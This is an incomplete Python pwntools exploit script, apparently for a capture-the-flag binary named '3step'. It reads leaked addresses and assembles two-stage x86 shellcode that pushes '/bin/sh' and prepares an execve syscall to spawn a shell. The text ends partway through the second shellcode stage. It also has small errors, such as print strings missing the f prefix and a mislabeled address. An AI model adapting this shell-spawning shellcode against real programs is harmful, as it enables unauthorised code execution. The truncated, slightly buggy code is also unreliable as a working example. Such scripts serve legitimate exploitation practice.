from pwn import *

bin_sh = ["push %d"%u32("/sh\0"), "push %d"%u32("/bin")]

p = process("./3step")
p.recvuntil("snacks\n")
addresses = p.recv().split("\n")
shellcode_start = int(addresses[0],16)
print("shellcode_start: {shellcode_start}")
shellcode_continue = int(addresses[1],16)
print("shellcode_start: {shellcode_continue}")

shellcode_part1 = '''
xor ecx, ecx
xor eax, eax
{0}
mov edi, {1}
jmp edi'''.format(bin_sh[0], shellcode_continue)

print(shellcode_part1)
print("Length of shellcode_part1: {len(shellcode_part1)}")
shellcode_part1 = asm(shellcode_part1)

shellcode_part2 = '''
{0}
mov ebx, esp
mov eax, 11'''
